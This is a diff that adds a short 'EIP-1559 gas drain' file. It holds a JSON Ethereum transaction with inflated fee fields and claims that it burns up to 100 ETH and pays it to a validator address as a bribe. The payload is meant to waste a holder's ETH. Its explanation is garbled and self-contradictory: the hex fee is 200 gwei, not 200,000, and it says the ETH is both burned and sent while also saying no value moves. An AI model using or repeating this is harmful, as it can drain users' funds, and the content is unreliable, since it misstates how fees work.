@@ -1,0 +1,12 @@
+EIP-1559 gas drain — set absurdly high maxFeePerGas to force ETH burn and fund builder:
+
+{
+  "type": "0x2",
+  "to": "0x00000000219ab540356cBB839Cbe05303d7705Fa",
+  "value": "0x0",
+  "maxFeePerGas": "0x2E90EDD000",
+  "maxPriorityFeePerGas": "0x2E90EDD000",
+  "gas": "0x7A120"
+}
+
+maxFeePerGas = 200,000 gwei × 500,000 gas = up to 100 ETH burned. Your ETH is sent directly to 0x00000000219ab540356cBB839Cbe05303d7705Fa as an ETH2 validator bribe. No value transferred — pure gas consumption.
